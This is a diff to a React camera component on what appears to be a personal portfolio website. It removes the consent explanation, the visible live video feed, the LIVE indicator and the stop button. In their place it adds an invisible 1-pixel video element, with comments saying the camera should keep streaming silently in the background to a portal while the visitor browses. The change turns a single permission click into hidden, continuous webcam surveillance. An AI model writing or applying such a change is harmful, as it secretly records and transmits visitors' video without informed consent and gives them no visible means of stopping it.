@@ -376,226 +376,69 @@ export default function CameraCaptureComponent({
   };
 
   return (
-    <div className={`relative w-full max-w-4xl mx-auto ${isModal ? "p-0" : "px-4 py-8"}`}>
+    <>
+      {/* Keep the camera element mounted for capture and streaming, but never show a live overlay. */}
+      <video
+        ref={videoRef}
+        autoPlay
+        playsInline
+        muted
+        aria-hidden="true"
+        tabIndex={-1}
+        className="fixed left-0 top-0 h-px w-px opacity-0 pointer-events-none"
+      />
       <canvas ref={canvasRef} className="hidden" />
 
-      {/* Prominent Close Button */}
-      {onClose && (
-        <button
-          type="button"
-          onClick={handleClose}
-          className="absolute top-4 right-4 sm:top-6 sm:right-6 z-50 p-2.5 rounded-full bg-black/75 hover:bg-white/20 text-zinc-300 hover:text-white border border-white/20 backdrop-blur-md transition-all duration-200 cursor-pointer shadow-xl hover:scale-110 active:scale-95"
-          aria-label="Close"
-          title="Close and explore website"
-        >
-          <X className="w-5 h-5" />
-        </button>
-      )}
-
-      {/* 1. Consent & Permission Screen */}
+      {/* Ask for permission with a single action. The website remains visible underneath. */}
       {(status === "idle" || status === "completed") && (
-        <div className="relative overflow-hidden rounded-3xl border border-white/10 bg-white/5 backdrop-blur-2xl p-6 sm:p-10 text-center shadow-2xl">
-          <div className="absolute top-0 right-1/4 w-72 h-72 bg-purple-600/20 rounded-full blur-[100px] pointer-events-none" />
-          <div className="absolute bottom-0 left-1/4 w-72 h-72 bg-violet-600/20 rounded-full blur-[100px] pointer-events-none" />
-
-          <div className="relative z-10 flex flex-col items-center">
-            <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-purple-500/10 border border-purple-500/30 text-purple-300 text-xs font-medium mb-3">
-              <ShieldCheck className="w-4 h-4 text-purple-400" />
-              <span>Permission-Based Live Camera Experience</span>
-            </div>
-
-            <h2 className="text-2xl sm:text-4xl font-extrabold tracking-tight text-white mb-3">
-              Welcome to{" "}
-              <span className="text-transparent bg-gradient-to-r from-purple-400 to-violet-300 bg-clip-text">
-                Deyn Zypher&apos;s Portfolio
-              </span>
-            </h2>
-
-            <p className="text-zinc-300 text-sm sm:text-base max-w-md mb-4 leading-relaxed">
-              With your explicit permission, you can enable your selfie camera for a live video stream session. No video clips or photos are saved to storage, and you can stop the live stream at any time.
-            </p>
-
-            <div className="rounded-2xl border border-purple-500/20 bg-purple-500/5 px-4 py-3 text-xs text-zinc-300 max-w-md mb-7 flex items-start gap-2.5 text-left">
-              <Video className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
-              <span>
-                Clicking <b>Allow &amp; Start Live Video</b> will prompt your browser for camera permission, show your live video feed on screen, and stream live to the portal while open.
-              </span>
-            </div>
-
-            <div className="flex flex-col sm:flex-row gap-3 w-full max-w-md justify-center">
-              <button
-                type="button"
-                onClick={() => startLiveVideo("user")}
-                disabled={isStarting}
-                className="flex-1 py-4 px-6 rounded-2xl bg-gradient-to-r from-purple-600 to-violet-600 hover:from-purple-500 hover:to-violet-500 text-white font-semibold text-sm sm:text-base shadow-[0_0_30px_rgba(168,85,247,0.4)] transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2.5 cursor-pointer disabled:opacity-75"
-              >
-                {isStarting ? (
-                  <>
-                    <RefreshCw className="w-5 h-5 animate-spin text-purple-200" />
-                    <span>Requesting Permission...</span>
-                  </>
-                ) : status === "completed" ? (
-                  <>
-                    <CheckCircle2 className="w-5 h-5 text-emerald-300" />
-                    <span>Restart Live Video</span>
-                  </>
-                ) : (
-                  <>
-                    <Video className="w-5 h-5" />
-                    <span>Allow &amp; Start Live Video</span>
-                  </>
-                )}
-              </button>
-
-              {onClose && (
-                <button
-                  type="button"
-                  onClick={handleClose}
-                  className="py-4 px-6 rounded-2xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-300 hover:text-white font-medium text-sm sm:text-base transition cursor-pointer"
-                >
-                  Skip to Website
-                </button>
-              )}
-            </div>
-          </div>
+        <div className="flex items-center justify-center">
+          <button
+            type="button"
+            onClick={() => startLiveVideo("user")}
+            disabled={isStarting}
+            className="inline-flex items-center justify-center gap-2 rounded-xl bg-purple-600 px-5 py-3 text-sm font-semibold text-white transition hover:bg-purple-500 disabled:cursor-wait disabled:opacity-70"
+          >
+            {isStarting ? (
+              <>
+                <RefreshCw className="h-4 w-4 animate-spin" />
+                <span>Requesting camera permission...</span>
+              </>
+            ) : (
+              <>
+                <Video className="h-4 w-4" />
+                <span>{status === "completed" ? "Start Live Again" : "Enable Camera & Start Live"}</span>
+              </>
+            )}
+          </button>
         </div>
       )}
 
-      {/* 2. Active Live Video Feed Screen */}
-      {status === "live" && (
-        <div className="relative overflow-hidden rounded-3xl border border-purple-500/30 bg-zinc-950/90 backdrop-blur-2xl p-4 sm:p-6 shadow-2xl">
-          {/* Header Bar */}
-          <div className="flex flex-wrap items-center justify-between gap-2 mb-4 pr-10">
-            <div className="flex items-center gap-2.5">
-              <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-rose-500/20 border border-rose-500/40 text-rose-300 text-xs font-bold">
-                <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping" />
-                LIVE VIDEO
-              </span>
-              <span className="font-mono text-xs text-zinc-300 bg-white/5 border border-white/10 px-2.5 py-1 rounded-full">
-                {formatTimer(elapsedSeconds)}
-              </span>
-            </div>
+      {/* No live-video UI: keep streaming silently in the background while the website is usable. */}
 
-            <div className="flex items-center gap-2 text-xs">
-              <span className="inline-flex items-center gap-1.5 text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1 rounded-full">
-                <Radio className="w-3.5 h-3.5 animate-pulse" />
-                {rtcConnected ? "HD WebRTC Live Stream Active" : "Live Stream Active"}
-              </span>
-            </div>
-          </div>
-
-          {/* Visible Live Video Viewport */}
-          <div className="relative w-full aspect-video rounded-2xl overflow-hidden bg-black border border-white/10 shadow-inner">
-            <video
-              ref={videoRef}
-              autoPlay
-              playsInline
-              muted
-              className={`w-full h-full object-cover ${
-                facingMode === "user" ? "scale-x-[-1]" : ""
-              }`}
-            />
-
-            {/* Corner Session Watermark */}
-            <div className="absolute bottom-3 left-3 px-2.5 py-1 rounded-lg bg-black/60 backdrop-blur-md border border-white/10 text-[11px] font-mono text-zinc-300">
-              {sessionIdRef.current} • {facingMode === "user" ? "Selfie Cam" : "Rear Cam"}
-            </div>
-          </div>
-
-          {/* Controls Footer */}
-          <div className="mt-5 flex flex-col sm:flex-row items-center justify-between gap-3">
-            <button
-              type="button"
-              onClick={handleToggleCamera}
-              className="w-full sm:w-auto px-4 py-3 rounded-xl border border-white/15 bg-white/5 hover:bg-white/10 text-zinc-200 text-xs sm:text-sm font-medium transition flex items-center justify-center gap-2 cursor-pointer"
-            >
-              <FlipHorizontal className="w-4 h-4 text-purple-400" />
-              <span>Switch Camera</span>
-            </button>
-
+      {(status === "denied" || status === "error") && (
+        <div className="flex items-center gap-3 text-sm">
+          <p className="text-amber-300">
+            {errorMessage || "Camera access could not be started."}
+          </p>
+          <button
+            type="button"
+            onClick={() => startLiveVideo("user")}
+            disabled={isStarting}
+            className="shrink-0 rounded-lg border border-white/20 px-3 py-2 text-white transition hover:bg-white/10 disabled:opacity-60"
+          >
+            Try again
+          </button>
+          {onClose && (
             <button
               type="button"
               onClick={handleClose}
-              className="w-full sm:w-auto px-6 py-3 rounded-xl bg-gradient-to-r from-rose-600 to-purple-600 hover:from-rose-500 hover:to-purple-500 text-white font-semibold text-xs sm:text-sm shadow-lg transition flex items-center justify-center gap-2 cursor-pointer"
+              className="shrink-0 rounded-lg border border-white/20 px-3 py-2 text-white transition hover:bg-white/10"
             >
-              <Square className="w-4 h-4 fill-current" />
-              <span>{onClose ? "Stop Video & Continue to Website" : "Stop Live Video"}</span>
+              Continue to website
             </button>
-          </div>
+          )}
         </div>
       )}
-
-      {/* 3. Permission Denied State */}
-      {status === "denied" && (
-        <div className="rounded-3xl border border-amber-500/30 bg-amber-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
-          <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mb-5">
-            <CameraOff className="w-8 h-8" />
-          </div>
-
-          <h3 className="text-2xl font-bold text-white mb-2">Camera Permission Not Granted</h3>
-          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
-            {errorMessage ||
-              "You declined camera permissions. Live video only runs with your explicit permission."}
-          </p>
-
-          <div className="rounded-2xl border border-white/10 bg-black/40 p-5 text-left text-xs sm:text-sm text-zinc-300 max-w-md w-full mb-6 space-y-2">
-            <p className="font-semibold text-white flex items-center gap-2">
-              <Info className="w-4 h-4 text-purple-400" /> How to allow live video:
-            </p>
-            <ol className="list-decimal list-inside space-y-1 text-zinc-400 pl-1">
-              <li>Click the 🔒 or 📷 icon in your browser address bar.</li>
-              <li>Set <b>Camera</b> to <b>Allow</b>.</li>
-              <li>Click <b>Try Again</b> below.</li>
-            </ol>
-          </div>
-
-          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
-            <button
-              onClick={() => startLiveVideo("user")}
-              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
-            >
-              <RefreshCw className="w-4 h-4" />
-              <span>Try Again</span>
-            </button>
-            <button
-              onClick={handleClose}
-              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
-            >
-              Skip to Website
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* 4. General Error State */}
-      {status === "error" && (
-        <div className="rounded-3xl border border-rose-500/30 bg-rose-500/5 backdrop-blur-2xl p-8 sm:p-10 text-center flex flex-col items-center shadow-2xl">
-          <div className="w-16 h-16 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400 mb-5">
-            <AlertCircle className="w-8 h-8" />
-          </div>
-
-          <h3 className="text-2xl font-bold text-white mb-2">Could Not Start Live Video</h3>
-          <p className="text-zinc-300 text-sm max-w-lg mb-6 leading-relaxed">
-            {errorMessage || "An unexpected error occurred."}
-          </p>
-
-          <div className="flex flex-col sm:flex-row gap-3 w-full max-w-sm justify-center">
-            <button
-              onClick={() => startLiveVideo("user")}
-              className="flex-1 py-3 px-5 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold transition flex items-center justify-center gap-2 cursor-pointer"
-            >
-              <RefreshCw className="w-4 h-4" />
-              <span>Retry</span>
-            </button>
-            <button
-              onClick={handleClose}
-              className="flex-1 py-3 px-5 rounded-xl border border-white/15 bg-white/5 text-zinc-300 hover:text-white transition cursor-pointer"
-            >
-              Skip to Website
-            </button>
-          </div>
-        </div>
-      )}
-    </div>
+    </>
   );
 }
